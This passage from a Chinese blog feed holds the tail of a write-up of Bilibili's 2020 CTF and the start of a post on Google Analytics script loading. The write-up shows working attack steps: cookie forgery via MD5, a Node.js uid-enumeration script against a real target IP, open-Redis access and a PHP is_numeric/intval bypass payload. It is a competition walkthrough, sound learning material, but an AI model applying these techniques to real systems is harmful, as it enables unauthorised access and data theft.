class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"flag2: \"</span> + data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.<span class=\"hljs-property\">data</span> + <span class=\"hljs-string\">\" }}\"</span>.<span class=\"hljs-title function_\">toLowerCase</span>() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {    (<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) {        $.getUrlParam = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) {            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">location</span>.<span class=\"hljs-property\">search</span>.<span class=\"hljs-title function_\">substr</span>(<span class=\"hljs-number\">1</span>).<span class=\"hljs-title function_\">match</span>(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.<span class=\"hljs-title function_\">getUrlParam</span>(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.<span class=\"hljs-title function_\">ajax</span>({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);            <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.<span class=\"hljs-property\">data</span>)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">get</span>(<span class=\"hljs-params\">hostname, path</span>) {  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.<span class=\"hljs-title function_\">request</span>(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.<span class=\"hljs-title function_\">push</span>(chunk); });        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            <span class=\"hljs-title function_\">resolve</span>(<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">concat</span>(body).<span class=\"hljs-title function_\">toString</span>());          } <span class=\"hljs-keyword\">catch</span> (e) {            <span class=\"hljs-title function_\">reject</span>(e);          }        });        req.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { <span class=\"hljs-title function_\">reject</span>(err); });      }    );    req.<span class=\"hljs-title function_\">setHeader</span>(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.<span class=\"hljs-title function_\">end</span>();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">get</span>(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">parse</span>(res).<span class=\"hljs-property\">code</span> === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-title function_ invoke__\">print_r</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> || [];</span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-params\"></span>){dataLayer.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>);}</span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>());</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>){i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){</span><span class=\"language-javascript\">(i[r].<span class=\"hljs-property\">q</span>=i[r].<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)},i[r].<span class=\"hljs-property\">l</span>=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();a=s.<span class=\"hljs-title function_\">createElement</span>(o),</span><span class=\"language-javascript\">m=s.<span class=\"hljs-title function_\">getElementsByTagName</span>(o)[<span class=\"hljs-number\">0</span>];a.<span class=\"hljs-property\">async</span>=<span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span>=g;m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a,m)</span><span class=\"language-javascript\">})(<span class=\"hljs-variable language_\">window</span>,<span class=\"hljs-variable language_\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {  <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> = (<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> || []).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">l</span> = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">createElement</span>(<span class=\"hljs-string\">'script'</span>);a.<span class=\"hljs-property\">async</span> = <span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span> = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>=<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){(ga.<span class=\"hljs-property\">q</span>=ga.<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};ga.<span class=\"hljs-property\">l</span>=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 